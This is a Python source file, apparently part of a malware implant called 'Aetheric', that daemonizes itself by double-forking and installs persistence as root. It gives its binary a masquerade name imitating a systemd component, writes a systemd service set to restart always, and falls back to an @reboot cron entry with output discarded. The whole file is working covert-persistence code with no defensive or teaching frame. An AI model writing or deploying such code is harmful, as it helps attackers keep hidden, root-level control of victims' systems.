"""
Daemonization and persistence installation.
"""
import os
import sys
import time
import subprocess
import signal
import atexit
from pathlib import Path

class Daemonizer:
    def __init__(self):
        self.pidfile = '/var/run/aetheric.pid'
        self.binary_path = '/usr/local/bin/systemd-resolved-update'  # masquerade name

    def daemonize(self):
        """Double-fork daemonization."""
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)  # exit parent
        except OSError as e:
            sys.exit(1)
        # First child
        os.chdir('/')
        os.setsid()
        os.umask(0)
        # Second fork
        try:
            pid = os.fork()
            if pid > 0:
                sys.exit(0)
        except OSError as e:
            sys.exit(1)
        # Daemon now
        sys.stdout.flush()
        sys.stderr.flush()
        # Redirect stdin/stdout/stderr to /dev/null
        with open('/dev/null', 'r') as f:
            os.dup2(f.fileno(), sys.stdin.fileno())
        with open('/dev/null', 'a+') as f:
            os.dup2(f.fileno(), sys.stdout.fileno())
            os.dup2(f.fileno(), sys.stderr.fileno())
        # Write pidfile
        with open(self.pidfile, 'w') as f:
            f.write(str(os.getpid()))
        atexit.register(self._remove_pidfile)
        signal.signal(signal.SIGTERM, self._signal_handler)

    def _remove_pidfile(self):
        if os.path.exists(self.pidfile):
            os.unlink(self.pidfile)

    def _signal_handler(self, signum, frame):
        self._remove_pidfile()
        sys.exit(0)

    def install_persistence(self):
        """Install systemd service or cron job."""
        # Check for systemd
        if os.path.exists('/run/systemd/system'):
            self._install_systemd()
        else:
            self._install_cron()

    def _install_systemd(self):
        service_content = f"""[Unit]
Description=Aetheric Daemon
After=network.target

[Service]
ExecStart={self.binary_path} --resume
Restart=always
User=root

[Install]
WantedBy=multi-user.target
"""
        service_path = '/etc/systemd/system/aetheric.service'
        with open(service_path, 'w') as f:
            f.write(service_content)
        subprocess.run(['systemctl', 'daemon-reload'], check=False)
        subprocess.run(['systemctl', 'enable', 'aetheric.service'], check=False)
        subprocess.run(['systemctl', 'start', 'aetheric.service'], check=False)

    def _install_cron(self):
        cron_line = f"@reboot root {self.binary_path} --resume >/dev/null 2>&1"
        # Write to /etc/cron.d/aetheric
        with open('/etc/cron.d/aetheric', 'w') as f:
            f.write(cron_line + '\n')
        # Also add a regular job to run every hour? Not needed.
